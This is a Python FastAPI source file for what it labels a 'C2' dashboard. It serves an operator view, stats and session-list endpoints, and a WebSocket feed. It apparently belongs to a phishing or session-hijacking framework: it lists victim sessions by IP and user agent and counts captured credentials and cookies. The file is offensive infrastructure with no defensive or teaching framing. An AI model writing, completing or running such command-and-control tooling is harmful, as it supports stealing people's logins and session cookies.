from fastapi import APIRouter, WebSocket, Request
from fastapi.responses import HTMLResponse
from core.session.session_manager import session_manager
from core.cache.redis_manager import redis_cache
import asyncio
import json
import time

router = APIRouter(prefix="/dashboard", tags=["Dashboard C2"])

# --- Dashboard View ---
@router.get("/", response_class=HTMLResponse)
async def dashboard_view():
    """Serve the C2 Dashboard HTML."""
    try:
        with open("core/web/templates/dashboard.html", "r") as f:
            return f.read()
    except FileNotFoundError:
        return "Dashboard template not found."

# --- API Endpoints ---
@router.get("/stats")
async def get_stats():
    """Get real-time stats."""
    # Count sessions
    session_keys = redis_cache.scan_keys("session:*")
    active_sessions = len(session_keys)
    
    captured_creds = 0
    captured_cookies = 0
    
    # Analyze sessions (expensive, optimize later)
    # For now, we just sample or rely on a separate counter if we had one.
    # To be fast, we will just count keys.
    
    return {
        "active_sessions": active_sessions,
        "captured_creds": captured_creds, # Todo: Implement counter in redis
        "captured_cookies": captured_cookies, # Todo: Implement counter
        "uptime": int(time.time())
    }

@router.get("/sessions")
async def get_sessions():
    """Get list of active sessions."""
    session_keys = redis_cache.scan_keys("session:*")
    sessions = []
    
    # Limit to last 50 for performance
    for key in session_keys[:50]: 
        session_id = key.split(":")[-1]
        session = session_manager.get_session(session_id)
        if session:
            sessions.append({
                "id": session.get("session_id"),
                "ip": session.get("client_ip"),
                "ua": session.get("user_agent")[:50] + "...",
                "status": session.get("status"),
                "captured": bool(session.get("captured_data")) or bool(session.get("cookies")),
                "created_at": session.get("created_at")
            })
            
    return sessions

# --- WebSocket ---
@router.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    try:
        while True:
            # Push stats every second
            stats = await get_stats()
            # Push sessions list (maybe optimize to only push updates)
            sessions = await get_sessions()
            
            await websocket.send_json({
                "type": "update",
                "stats": stats,
                "sessions": sessions
            })
            await asyncio.sleep(2)
    except Exception as e:
        print(f"WebSocket disconnected: {e}")
